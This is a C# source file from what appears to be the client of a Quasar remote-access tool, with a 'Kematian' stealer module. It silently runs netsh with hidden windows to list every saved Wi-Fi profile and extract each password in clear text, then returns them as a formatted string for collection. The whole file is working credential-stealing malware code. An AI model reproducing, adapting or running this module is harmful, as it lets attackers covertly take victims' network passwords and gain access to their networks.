using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Text;

namespace Quasar.Client.Kematian.Wifi
{
    public class GetWifis
    {
        public static string Passwords()
        {
            var passwords = new List<string>();

            var methods = new List<Func<string[]>>()
            {
                GetPasswordsFromSystem.Passwords,
            };

            Parallel.ForEach(methods, method =>
            {
                try
                {
                    var result = method();
                    if (result != null)
                    {
                        lock (passwords)
                        {
                            passwords.AddRange(result);
                        }
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine(ex);
                }
            });

            return string.Join(Environment.NewLine, passwords);
        }
    }

    internal class GetPasswordsFromSystem
    {
        public static string[] Passwords()
        {
            try
            {
                // Execute netsh command to get wifi profiles
                Process process = new Process();
                process.StartInfo.FileName = "netsh";
                process.StartInfo.Arguments = "wlan show profiles";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.CreateNoWindow = true;
                process.Start();

                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                // Extract profile names
                List<string> profiles = new List<string>();
                string[] lines = output.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);

                foreach (string line in lines)
                {
                    if (line.Contains("All User Profile"))
                    {
                        string profileName = line.Split(':')[1].Trim();
                        profiles.Add(profileName);
                    }
                }

                // Get passwords for each profile
                List<string> results = new List<string>();
                foreach (string profile in profiles)
                {
                    process = new Process();
                    process.StartInfo.FileName = "netsh";
                    process.StartInfo.Arguments = $"wlan show profile name=\"{profile}\" key=clear";
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.CreateNoWindow = true;
                    process.Start();

                    string profileOutput = process.StandardOutput.ReadToEnd();
                    process.WaitForExit();

                    string[] profileLines = profileOutput.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
                    foreach (string line in profileLines)
                    {
                        if (line.Contains("Key Content"))
                        {
                            string password = line.Split(':')[1].Trim();
                            results.Add($"WiFi: {profile} - Password: {password}");
                            break;
                        }
                    }
                }

                return results.ToArray();
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex);
                return new string[0];
            }
        }
    }
}